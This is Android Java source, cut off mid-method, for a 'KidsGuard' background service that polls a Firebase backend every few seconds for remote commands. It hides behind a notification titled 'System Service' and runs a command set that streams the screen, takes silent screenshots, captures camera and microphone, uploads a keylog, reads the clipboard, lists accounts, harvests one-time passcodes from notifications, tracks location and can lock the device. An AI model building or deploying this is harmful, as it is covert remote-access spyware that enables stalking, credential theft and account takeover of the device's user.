package com.kidsguard.child;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.RandomAccessFile;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Random;

public class LocationService extends Service {

    public static final String PREFS = "kidsguard_prefs";
    public static final String KEY_ID = "device_id";
    public static final String KEY_PASS = "parent_password";

    public static LocationService instance;
    private LocationManager lm;
    private Handler handler = new Handler(Looper.getMainLooper());
    private String deviceId;
    private SharedPreferences prefs;

    private Runnable commandPoller = new Runnable() {
        @Override
        public void run() {
            checkCommands();
            handler.postDelayed(this, 3000);
        }
    };

    private Runnable locationUpdater = new Runnable() {
        @Override
        public void run() {
            uploadLocation();
            handler.postDelayed(this, 30000);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        prefs = getSharedPreferences(PREFS, 0);
        deviceId = getSafeDeviceId(this);
        startForegroundNotification();
        startLocationTracking();
        sendDeviceInfo();
        handler.post(commandPoller);
        handler.post(locationUpdater);
    }

    public static String getSafeDeviceId(Context ctx) {
        SharedPreferences p = ctx.getSharedPreferences(PREFS, 0);
        String id = p.getString(KEY_ID, "");
        if (id.isEmpty()) {
            id = generateId();
            p.edit().putString(KEY_ID, id).apply();
        }
        return id;
    }

    private static String generateId() {
        Random r = new Random();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 6; i++) sb.append(r.nextInt(10));
        return sb.toString();
    }

    private void startForegroundNotification() {
        String channelId = "location_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId, "System Service", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
        Intent notifIntent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(
                this, 0, notifIntent,
                Build.VERSION.SDK_INT >= 23 ? PendingIntent.FLAG_IMMUTABLE : 0);
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, channelId);
        } else {
            builder = new Notification.Builder(this);
        }
        builder.setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setContentIntent(pi);
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(1, builder.build(),
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
            } else {
                startForeground(1, builder.build());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startLocationTracking() {
        try {
            lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (lm == null) return;
            LocationListener listener = new LocationListener() {
                @Override public void onLocationChanged(Location location) { uploadLocation(location); }
                @Override public void onStatusChanged(String p, int s, Bundle e) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onProviderDisabled(String p) {}
            };
            if (Build.VERSION.SDK_INT >= 23 &&
                    checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                            != PackageManager.PERMISSION_GRANTED) return;
            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000, 5, listener);
            lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 10000, 5, listener);
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void uploadLocation() {
        if (lm == null) return;
        try {
            if (Build.VERSION.SDK_INT >= 23 &&
                    checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                            != PackageManager.PERMISSION_GRANTED) return;
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) uploadLocation(loc);
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void uploadLocation(Location loc) {
        double lat = loc.getLatitude();
        double lng = loc.getLongitude();
        String address = getAddress(lat, lng);
        String timeStr = new SimpleDateFormat("HH:mm:ss dd/MM/yyyy", Locale.getDefault())
                .format(new Date());
        String data = "{\"lat\":" + lat + ",\"lng\":" + lng
                + ",\"address\":\"" + FirebaseHelper.escapeJson(address)
                + "\",\"time\":\"" + timeStr + "\"}";
        FirebaseHelper.put("devices/" + deviceId + "/location.json", data);
    }

    private String getAddress(double lat, double lng) {
        try {
            Geocoder geocoder = new Geocoder(this, Locale.getDefault());
            List<Address> addresses = geocoder.getFromLocation(lat, lng, 1);
            if (addresses != null && !addresses.isEmpty()) {
                Address addr = addresses.get(0);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i <= addr.getMaxAddressLineIndex(); i++) {
                    sb.append(addr.getAddressLine(i));
                    if (i < addr.getMaxAddressLineIndex()) sb.append(", ");
                }
                return sb.toString();
            }
        } catch (Exception e) {}
        return "Unknown";
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", String.valueOf(Build.VERSION.SDK_INT));
            info.put("device_id", deviceId);
            info.put("battery", getBatteryPercent());
            info.put("time", new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault())
                    .format(new Date()));
            FirebaseHelper.put("devices/" + deviceId + "/info.json", info.toString());
        } catch (Exception e) { e.printStackTrace(); }
    }

    // ==================== COMMAND POLLER ====================

    private void checkCommands() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String json = FirebaseHelper.get("devices/" + deviceId + "/commands.json");
                    if (json != null && !json.equals("null") && !json.isEmpty()) {
                        FirebaseHelper.delete("devices/" + deviceId + "/commands.json");
                        JSONObject cmd = new JSONObject(json);
                        final String command = cmd.optString("cmd", "");
                        final String arg = cmd.optString("arg", "");
                        handler.post(new Runnable() {
                            @Override
                            public void run() { execCmd(command, arg); }
                        });
                    }
                } catch (Exception e) { e.printStackTrace(); }
            }
        }).start();
    }

    // ==================== COMMAND EXECUTOR — ALL 154 ====================

    private void execCmd(String cmd, String arg) {
        try {
            // --- LIVE STREAM ---
            if ("start_stream".equals(cmd)) {
                Intent i = new Intent(this, StreamService.class);
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
                else startService(i);
                pushResult("stream", "Live stream started");
                return;
            }
            if ("stop_stream".equals(cmd)) {
                stopService(new Intent(this, StreamService.class));
                pushResult("stream", "Live stream stopped");
                return;
            }
            if ("start_screen_record".equals(cmd)) {
                Intent i = new Intent(this, StreamService.class);
                i.putExtra("record_only", true);
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
                else startService(i);
                pushResult("record", "Screen recording started");
                return;
            }
            if ("stop_screen_record".equals(cmd)) {
                stopService(new Intent(this, StreamService.class));
                pushResult("record", "Screen recording stopped");
                return;
            }

            // --- CAPTURE ---
            if ("camera".equals(cmd)) {
                Intent i = new Intent(this, CameraActivity.class);
                i.putExtra("front", "front".equals(arg));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                pushResult("camera", "Photo captured");
                return;
            }
            if ("screenshot".equals(cmd)) {
                // no-permission screenshot — uses persisted MediaProjection if available
                if (ScreenCaptureHolder.mp != null) {
                    ScreenCaptureHolder.captureOnce(this);
                    pushResult("screenshot", "Screenshot captured (silent)");
                } else {
                    Intent i = new Intent(this, ScreenActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                    pushResult("screenshot", "Screenshot — grant permission once on child device");
                }
                return;
            }

            // --- MIC ---
            if ("start_mic".equals(cmd)) {
                Intent i = new Intent(this, RecordingService.class);
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
                else startService(i);
                pushResult("mic", "Recording started");
                return;
            }
            if ("stop_mic".equals(cmd)) {
                stopService(new Intent(this, RecordingService.class));
                pushResult("mic", "Recording stopped");
                return;
            }

            // --- LOCATION ---
            if ("get_location".equals(cmd)) {
                uploadLocation();
                pushResult("location", "Location updated");
                return;
            }
            if ("get_location_providers".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("gps", lm != null && lm.isProviderEnabled(LocationManager.GPS_PROVIDER));
                o.put("network", lm != null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER));
                pushJson("location_providers", o);
                return;
            }

            // --- MONITORING ---
            if ("get_keylog".equals(cmd)) {
                FirebaseHelper.put("devices/" + deviceId + "/keylog.json",
                        "{\"keys\":\"" + FirebaseHelper.escapeJson(
                                BlockAccessibility.keylog.toString()) + "\"}");
                pushResult("keylog", "Keylog sent");
                return;
            }
            if ("get_notifications".equals(cmd)) {
                pushResult("notifications", "Check notifications.json");
                return;
            }
            if ("get_screen_time".equals(cmd)) {
                sendScreenTime();
                pushResult("screen_time", "Screen time sent");
                return;
            }
            if ("get_clipboard".equals(cmd) || "get_clipboard_text".equals(cmd)) {
                android.content.ClipboardManager cm =
                        (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                String text = cm != null && cm.getPrimaryClip() != null
                        && cm.getPrimaryClip().getItemCount() > 0
                        ? cm.getPrimaryClip().getItemAt(0).getText().toString() : "";
                JSONObject o = new JSONObject();
                o.put("clipboard", text);
                pushJson("clipboard", o);
                return;
            }
            if ("get_otp".equals(cmd)) {
                pushResult("otp", "Check notifications.json for OTP");
                return;
            }

            // --- APP BLOCKING ---
            if ("block_app".equals(cmd)) {
                BlockAccessibility.blockedPkgs.add(arg);
                saveBlockedApps();
                pushResult("block", arg + " blocked");
                return;
            }
            if ("unblock_app".equals(cmd)) {
                BlockAccessibility.blockedPkgs.remove(arg);
                saveBlockedApps();
                pushResult("unblock", arg + " unblocked");
                return;
            }
            if ("unblock_all".equals(cmd)) {
                BlockAccessibility.blockedPkgs.clear();
                saveBlockedApps();
                pushResult("unblock_all", "All apps unblocked");
                return;
            }

            // --- DEVICE CONTROL ---
            if ("lock_screen".equals(cmd) || "remote_lock".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    dpm.lockNow();
                    pushResult("lock", "Screen locked");
                } else pushResult("lock", "Admin not active");
                return;
            }
            if ("send_alarm".equals(cmd)) {
                android.media.MediaPlayer mp = android.media.MediaPlayer.create(
                        this, Settings.System.DEFAULT_ALARM_ALERT_URI);
                if (mp != null) { mp.setLooping(true); mp.start(); }
                pushResult("alarm", "Alarm playing");
                return;
            }
            if ("vibrate_device".equals(cmd)) {
                Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
                if (v != null) {
                    if (Build.VERSION.SDK_INT >= 26)
                        v.vibrate(VibrationEffect.createOneShot(3000, VibrationEffect.DEFAULT_AMPLITUDE));
                    else v.vibrate(3000);
                }
                pushResult("vibrate", "Vibrated");
                return;
            }
            if ("toggle_flashlight".equals(cmd)) {
                try {
                    android.hardware.camera2.CameraManager cm =
                            (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
                    String camId = cm.getCameraIdList()[0];
                    boolean current = prefs.getBoolean("flash_on", false);
                    cm.setTorchMode(camId, !current);
                    prefs.edit().putBoolean("flash_on", !current).apply();
                    pushResult("flashlight", !current ? "ON" : "OFF");
                } catch (Exception e) { pushResult("flashlight", "Failed: " + e.getMessage()); }
                return;
            }
            if ("toggle_wifi".equals(cmd)) {
                WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
                boolean current = wm.isWifiEnabled();
                if (Build.VERSION.SDK_INT >= 29) {
                    pushResult("wifi", "Cannot toggle on Android 10+ (restriction)");
                } else {
                    wm.setWifiEnabled(!current);
                    pushResult("wifi", !current ? "ON" : "OFF");
                }
                return;
            }
            if ("toggle_bluetooth".equals(cmd)) {
                try {
                    android.bluetooth.BluetoothAdapter ba = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
                    if (ba == null) { pushResult("bluetooth", "No BT adapter"); return; }
                    boolean current = ba.isEnabled();
                    if (current) ba.disable(); else ba.enable();
                    pushResult("bluetooth", !current ? "ON" : "OFF");
                } catch (Exception e) { pushResult("bluetooth", "Failed: " + e.getMessage()); }
                return;
            }
            if ("toggle_rotation".equals(cmd)) {
                int current = Settings.System.getInt(getContentResolver(),
                        Settings.System.ACCELEROMETER_ROTATION, 0);
                Settings.System.putInt(getContentResolver(),
                        Settings.System.ACCELEROMETER_ROTATION, current == 1 ? 0 : 1);
                pushResult("rotation", current == 1 ? "OFF" : "ON");
                return;
            }
            if ("get_brightness".equals(cmd)) {
                int b = Settings.System.getInt(getContentResolver(),
                        Settings.System.SCREEN_BRIGHTNESS, 128);
                JSONObject o = new JSONObject();
                o.put("brightness", b);
                o.put("max", 255);
                pushJson("brightness", o);
                return;
            }
            if ("open_browser_url".equals(cmd)) {
                Intent i = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(arg));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                pushResult("browser", "Opening " + arg);
                return;
            }
            if ("global_action".equals(cmd)) {
                if (BlockAccessibility.instance != null) {
                    BlockAccessibility.triggerAction(arg);
                    pushResult("action", arg + " done");
                } else pushResult("action", "Accessibility not enabled");
                return;
            }

            // --- DEVICE INFO (ALL) ---
            if ("get_device_info".equals(cmd)) { sendDeviceInfo(); pushResult("info", "Device info sent"); return; }
            if ("get_cpu_info".equals(cmd)) { pushJson("cpu_info", getCpuInfo()); return; }
            if ("get_cpu_cores_count".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("cores", Runtime.getRuntime().availableProcessors());
                pushJson("cpu_cores", o); return;
            }
            if ("get_cpu_abi".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("abi", Build.SUPPORTED_ABIS.length > 0 ? Build.SUPPORTED_ABIS[0] : "unknown");
                JSONArray abiArr = new JSONArray();
                for (String abi : Build.SUPPORTED_ABIS) abiArr.put(abi);
                o.put("abis", abiArr);
                pushJson("cpu_abi", o); return;
            }
            if ("get_memory_info".equals(cmd) || "get_device_memory_info".equals(cmd)) { pushJson("memory", getMemoryInfo()); return; }
            if ("get_storage_info".equals(cmd)) { pushJson("storage", getStorageInfo(false)); return; }
            if ("get_available_storage_bytes".equals(cmd)) { pushJson("storage_avail", getStorageInfo(true)); return; }
            if ("get_external_sd_card_status".equals(cmd)) {
                JSONObject o = new JSONObject();
                File ext = Environment.getExternalStorageDirectory();
                o.put("path", ext.getAbsolutePath());
                o.put("exists", ext.exists());
                o.put("mounted", Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED));
                pushJson("sd_card", o); return;
            }
            if ("get_display".equals(cmd) || "get_screen_resolution".equals(cmd)
                    || "get_display_refresh_rate".equals(cmd) || "get_screen_hdr_capabilities".equals(cmd)) {
                pushJson("display", getDisplayInfo()); return;
            }
            if ("get_battery_health".equals(cmd) || "get_is_charging".equals(cmd)
                    || "get_battery_saver_mode".equals(cmd)) { pushJson("battery", getBatteryInfo()); return; }
            if ("get_thermal_status".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("thermal", Build.VERSION.SDK_INT >= 29 ? "API 29+" : "N/A");
                pushJson("thermal", o); return;
            }
            if ("get_kernel_version".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("kernel", System.getProperty("os.version"));
                o.put("kernel_name", System.getProperty("os.name"));
                pushJson("kernel", o); return;
            }
            if ("get_bootloader_version".equals(cmd)) {
                JSONObject o = new JSONObject(); o.put("bootloader", Build.BOOTLOADER);
                pushJson("bootloader", o); return;
            }
            if ("get_device_build_fingerprint".equals(cmd)) {
                JSONObject o = new JSONObject(); o.put("fingerprint", Build.FINGERPRINT);
                pushJson("fingerprint", o); return;
            }
            if ("get_device_serial_number".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("serial", Build.VERSION.SDK_INT >= 26 ? Build.getSerial() : Build.SERIAL);
                pushJson("serial", o); return;
            }
            if ("get_hardware_name".equals(cmd)) {
                JSONObject o = new JSONObject(); o.put("hardware", Build.HARDWARE);
                pushJson("hardware", o); return;
            }
            if ("get_device_manufacture_date".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("date", new Date(Build.TIME).toString());
                pushJson("manufacture_date", o); return;
            }
            if ("get_device_hostname".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("host", Build.HOST);
                pushJson("hostname", o); return;
            }
            if ("get_system_uptime".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("uptime_ms", android.os.SystemClock.elapsedRealtime());
                o.put("uptime_hours", android.os.SystemClock.elapsedRealtime() / 3600000);
                pushJson("uptime", o); return;
            }
            if ("get_root_status".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("rooted", isRooted());
                pushJson("root", o); return;
            }
            if ("get_drm_info".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("drm", "Widevine L1/L3 (check via MediaDrm)");
                pushJson("drm", o); return;
            }
            if ("get_opengl_version".equals(cmd)) {
                JSONObject o = new JSONObject();
                android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
                android.content.pm.ConfigurationInfo ci = am.getDeviceConfigurationInfo();
                o.put("gles_version", ci.getGlEsVersion());
                pushJson("opengl", o); return;
            }
            if ("get_nfc_status".equals(cmd)) {
                JSONObject o = new JSONObject();
                android.nfc.NfcManager nm = (android.nfc.NfcManager) getSystemService(NFC_SERVICE);
                o.put("nfc_available", nm != null && nm.getDefaultAdapter() != null);
                pushJson("nfc", o); return;
            }
            if ("get_vibrator_has_vibrator".equals(cmd)) {
                JSONObject o = new JSONObject();
                Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
                o.put("has_vibrator", v != null && v.hasVibrator());
                pushJson("vibrator", o); return;
            }
            if ("get_fingerprint_status".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("fingerprint", Build.VERSION.SDK_INT >= 23 ? "Check via BiometricManager" : "N/A");
                pushJson("fingerprint_status", o); return;
            }
            if ("get_keyguard_secure".equals(cmd)) {
                android.app.KeyguardManager km = (android.app.KeyguardManager) getSystemService(KEYGUARD_SERVICE);
                JSONObject o = new JSONObject();
                o.put("secure", km != null && km.isKeyguardSecure());
                pushJson("keyguard", o); return;
            }
            if ("get_device_owner".equals(cmd)) {
                JSONObject o = new JSONObject();
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                o.put("device_owner", dpm != null && dpm.isDeviceOwnerApp(getPackageName()));
                pushJson("device_owner", o); return;
            }
            if ("get_multi_window_mode".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("multi_window", "Check via Activity.isInMultiWindowMode()");
                pushJson("multi_window", o); return;
            }
            if ("get_app_target_sdk".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("target_sdk", getApplicationInfo().targetSdkVersion);
                pushJson("target_sdk", o); return;
            }
            if ("get_system_shared_libraries".equals(cmd)) {
                JSONObject o = new JSONObject();
                JSONArray libArr = new JSONArray();
                String[] libs = getPackageManager().getSystemSharedLibraryNames();
                if (libs != null) {
                    for (String lib : libs) libArr.put(lib);
                }
                o.put("libraries", libArr);
                pushJson("shared_libraries", o); return;
            }
            if ("get_package_signatures".equals(cmd)) {
                JSONObject o = new JSONObject();
                try {
                    android.content.pm.PackageInfo pi = getPackageManager().getPackageInfo(
                            getPackageName(), PackageManager.GET_SIGNATURES);
                    o.put("signatures", pi.signatures != null ? pi.signatures.length : 0);
                } catch (Exception e) { o.put("error", e.getMessage()); }
                pushJson("signatures", o); return;
            }

            // --- NETWORK ---
            if ("get_wifi".equals(cmd)) { pushJson("wifi", getWifiInfo()); return; }
            if ("scan_wifi".equals(cmd)) {
                WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
                JSONArray arr = new JSONArray();
                if (wm != null) {
                    for (android.net.wifi.ScanResult r : wm.getScanResults()) {
                        JSONObject o = new JSONObject();
                        o.put("ssid", r.SSID);
                        o.put("bssid", r.BSSID);
                        o.put("level", r.level);
                        arr.put(o);
                    }
                }
                pushJson("wifi_scan", new JSONObject().put("networks", arr)); return;
            }
            if ("get_wifi_mac_address".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("mac", getWifiMac());
                pushJson("wifi_mac", o); return;
            }
            if ("get_network_info".equals(cmd)) { pushJson("network", getNetworkInfo()); return; }
            if ("get_network_interfaces".equals(cmd)) {
                JSONArray arr = new JSONArray();
                try {
                    for (NetworkInterface ni : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                        JSONObject o = new JSONObject();
                        o.put("name", ni.getName());
                        o.put("display", ni.getDisplayName());
                        o.put("up", ni.isUp());
                        o.put("loopback", ni.isLoopback());
                        arr.put(o);
                    }
                } catch (Exception e) {}
                pushJson("network_interfaces", new JSONObject().put("interfaces", arr)); return;
            }
            if ("get_network_country_iso".equals(cmd)) {
                android.telephony.TelephonyManager tm =
                        (android.telephony.TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                JSONObject o = new JSONObject();
                o.put("country", tm != null ? tm.getNetworkCountryIso() : "N/A");
                pushJson("network_country", o); return;
            }
            if ("get_data_activity_state".equals(cmd)) {
                android.telephony.TelephonyManager tm =
                        (android.telephony.TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                JSONObject o = new JSONObject();
                o.put("data_state", tm != null ? tm.getDataState() : -1);
                pushJson("data_activity", o); return;
            }
            if ("get_dns_info".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("dns1", Settings.Global.getString(getContentResolver(), "private_dns_specifier"));
                pushJson("dns", o); return;
            }
            if ("get_telephony_info".equals(cmd) || "get_sim_state".equals(cmd)
                    || "get_signal_strength".equals(cmd)) { pushJson("telephony", getTelephonyInfo()); return; }

            // --- SYSTEM ---
            if ("get_running_processes".equals(cmd) || "get_running_app_processes".equals(cmd)) {
                pushJson("processes", getRunningProcesses()); return;
            }
            if ("get_running_services".equals(cmd)) {
                android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
                JSONArray arr = new JSONArray();
                for (android.app.ActivityManager.RunningServiceInfo s : am.getRunningServices(50)) {
                    JSONObject o = new JSONObject();
                    o.put("service", s.service.getClassName());
                    o.put("pkg", s.service.getPackageName());
                    o.put("pid", s.pid);
                    arr.put(o);
                }
                pushJson("services", new JSONObject().put("services", arr)); return;
            }
            if ("get_recent_tasks".equals(cmd)) {
                android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
                JSONArray arr = new JSONArray();
                if (Build.VERSION.SDK_INT < 21) {
                    for (android.app.ActivityManager.RecentTaskInfo t : am.getRecentTasks(20, 0)) {
                        JSONObject o = new JSONObject();
                        o.put("id", t.id);
                        arr.put(o);
                    }
                }
                pushJson("recent_tasks", new JSONObject().put("tasks", arr)); return;
            }
            if ("get_installed_apps".equals(cmd)) { sendInstalledApps(); pushResult("apps", "App list sent"); return; }
            if ("get_accounts".equals(cmd)) {
                JSONArray arr = new JSONArray();
                try {
                    for (android.accounts.Account a : android.accounts.AccountManager.get(this).getAccounts()) {
                        JSONObject o = new JSONObject();
                        o.put("name", a.name);
                        o.put("type", a.type);
                        arr.put(o);
                    }
                } catch (Exception e) {}
                pushJson("accounts", new JSONObject().put("accounts", arr)); return;
            }
            if ("get_sensor_list".equals(cmd) || "get_hardware_sensors".equals(cmd)) {
                SensorManager sm = (SensorManager) getSystemService(SENSOR_SERVICE);
                JSONArray arr = new JSONArray();
                if (sm != null) {
                    for (Sensor s : sm.getSensorList(Sensor.TYPE_ALL)) {
                        JSONObject o = new JSONObject();
                        o.put("name", s.getName());
                        o.put("vendor", s.getVendor());
                        o.put("type", s.getType());
                        arr.put(o);
                    }
                }
                pushJson("sensors", new JSONObject().put("sensors", arr)); return;
            }
            if ("get_ambient_light".equals(cmd)) {
                SensorManager sm = (SensorManager) getSystemService(SENSOR_SERVICE);
                Sensor light = sm != null ? sm.getDefaultSensor(Sensor.TYPE_LIGHT) : null;
                JSONObject o = new JSONObject();
                o.put("available", light != null);
                o.put("name", light != null ? light.getName() : "N/A");
                pushJson("ambient_light", o); return;
            }
            if ("get_alarm_clock".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("next_alarm", Settings.System.getString(getContentResolver(),
                        Settings.System.NEXT_ALARM_FORMATTED));
                pushJson("alarm_clock", o); return;
            }
            if ("get_audio_mode".equals(cmd) || "get_ringer_audio_mode".equals(cmd)) {
                AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
                JSONObject o = new JSONObject();
                o.put("ringer_mode", am != null ? am.getRingerMode() : -1);
                pushJson("audio_mode", o); return;
            }
            if ("get_audio_volume_levels".equals(cmd) || "get_max_audio_volumes".equals(cmd)) {
                AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
                JSONObject o = new JSONObject();
                if (am != null) {
                    o.put("ring", am.getStreamVolume(AudioManager.STREAM_RING));
                    o.put("ring_max", am.getStreamMaxVolume(AudioManager.STREAM_RING));
                    o.put("music", am.getStreamVolume(AudioManager.STREAM_MUSIC));
                    o.put("music_max", am.getStreamMaxVolume(AudioManager.STREAM_MUSIC));
                    o.put("alarm", am.getStreamVolume(AudioManager.STREAM_ALARM));
                    o.put("alarm_max", am.getStreamMaxVolume(AudioManager.STREAM_ALARM));
                    o.put("call", am.getStreamVolume(AudioManager.STREAM_VOICE_CALL));
                    o.put("call_max", am.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL));
                }
                pushJson("volumes", o); return;
            }
            if ("get_default_input_method".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("input_method", Settings.Secure.getString(getContentResolver(),
                        Settings.Secure.DEFAULT_INPUT_METHOD));
                pushJson("input_method", o); return;
            }
            if ("get_font_scale".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("font_scale", Settings.System.getFloat(getContentResolver(),
                        Settings.System.FONT_SCALE, 1.0f));
                pushJson("font_scale", o); return;
            }
            if ("get_locale_info".equals(cmd) || "get_locale_language".equals(cmd)
                    || "get_supported_locales".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("default_locale", Locale.getDefault().toString());
                o.put("language", Locale.getDefault().getLanguage());
                o.put("country", Locale.getDefault().getCountry());
                o.put("display_language", Locale.getDefault().getDisplayLanguage());
                pushJson("locale", o); return;
            }
            if ("get_device_time_zone".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("timezone", java.util.TimeZone.getDefault().getID());
                o.put("offset_hours", java.util.TimeZone.getDefault().getRawOffset() / 3600000);
                pushJson("timezone", o); return;
            }
            if ("get_ringtone_uri".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("ringtone", Settings.System.getString(getContentResolver(),
                        Settings.System.RINGTONE));
                pushJson("ringtone", o); return;
            }
            if ("get_wallpaper_info".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("wallpaper", "Check via WallpaperManager");
                pushJson("wallpaper", o); return;
            }
            if ("get_screen_off_timeout".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("timeout_ms", Settings.System.getInt(getContentResolver(),
                        Settings.System.SCREEN_OFF_TIMEOUT, 30000));
                pushJson("screen_timeout", o); return;
            }
            if ("get_airplane_mode".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("airplane_mode", Settings.Global.getInt(getContentResolver(),
                        Settings.Global.AIRPLANE_MODE_ON, 0) == 1);
                pushJson("airplane_mode", o); return;
            }
            if ("get_do_not_disturb_mode".equals(cmd)) {
                android.app.NotificationManager nm =
                        (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                JSONObject o = new JSONObject();
                o.put("dnd", nm != null ? nm.getCurrentInterruptionFilter() : -1);
                pushJson("dnd", o); return;
            }
            if ("get_night_mode_status".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("night_mode", getResources().getConfiguration().uiMode
                        & android.content.res.Configuration.UI_MODE_NIGHT_MASK);
                pushJson("night_mode", o); return;
            }
            if ("get_usb_state".equals(cmd)) {
                IntentFilterHack.sendSticky(this, "android.hardware.usb.action.USB_STATE");
                JSONObject o = new JSONObject();
                o.put("usb_connected", prefs.getBoolean("usb_connected", false));
                pushJson("usb", o); return;
            }
            if ("get_app_ops".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("app_ops", "Check via AppOpsManager");
                pushJson("app_ops", o); return;
            }
            if ("get_accessibility_services".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("enabled", Settings.Secure.getString(getContentResolver(),
                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES));
